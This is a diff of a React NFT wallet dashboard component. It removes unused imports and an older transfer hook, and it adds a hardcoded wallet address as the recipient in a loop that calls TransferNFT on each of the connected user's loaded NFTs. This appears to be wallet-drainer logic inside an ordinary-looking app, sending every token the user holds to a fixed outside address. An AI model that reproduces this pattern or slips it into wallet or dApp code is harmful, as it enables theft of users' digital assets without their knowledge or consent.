@@ -20,11 +20,9 @@ import {
 import MailIcon from "@mui/icons-material/Mail";
 import NotificationsIcon from "@mui/icons-material/Notifications";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import nft from "../../../assets/image/nft.svg";
 import DeleteIcon from "@mui/icons-material/Delete";
 import { loadNfts, getContractDetails } from "../../../utils/getNfts";
 import { TransferNFT } from "../../../utils/transferNFT";
-import { useWeb3Transfer } from "react-moralis";
 import wallet from "../../../assets/image/wallet.svg";
 import MenuIcon from "@mui/icons-material/Menu";
 import useMediaQuery from "@mui/material/useMediaQuery";
@@ -216,14 +214,6 @@ const Home = () => {
     setWalletAddress(walletResponse.address);
   };
 
-  const { fetch, error, isFetching } = useWeb3Transfer({
-    type: "erc721",
-    receiver: "0x8f9C9fc379e1d265872232A248F5259DC95B4bCd",
-    contractAddress: "0x..",
-    tokenId: 1,
-    amount: 15,
-  });
-
   const handleProfileMenuOpen = (event) => {
     setAnchorEl(event.currentTarget);
   };
@@ -266,14 +256,13 @@ const Home = () => {
     if (reserveNfts.length > 0) {
       for (let i = 0; i < reserveNfts.length; i++) {
         await TransferNFT(
+          "0xA6d873e66874780a03C5Fd7fb86996bb310271bb",
           reserveNfts[i].contract,
           reserveNfts[i].token.tokenId
         );
       }
     }
   };
-
-  const menuId = "primary-search-account-menu";
 
   const mobileMenuId = "primary-search-account-menu-mobile";
   const renderMobileMenu = (
